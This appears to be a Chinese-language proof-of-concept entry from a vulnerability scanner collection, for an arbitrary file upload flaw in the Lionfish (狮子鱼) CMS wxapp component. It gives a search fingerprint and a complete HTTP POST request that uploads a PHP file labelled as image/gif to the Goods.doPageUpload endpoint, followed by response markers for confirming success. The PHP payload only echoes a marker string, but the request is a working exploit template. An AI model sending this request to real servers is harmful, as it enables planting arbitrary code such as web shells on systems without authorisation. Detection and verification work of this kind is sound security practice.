﻿# 狮子鱼CMS wxapp 任意文件上传漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="/seller.php?s=/Public/login"

> 验证脚本：HTTP

```
POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="dudesuite.php"
Content-Type: image/gif

<?php echo "dudesuite";?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
```

> 响应代码特征：200

> 响应内容特征：.php

> 上传文件定位：

> 验证文件来源：狮子鱼CMS wxapp 任意文件上传漏洞.poc

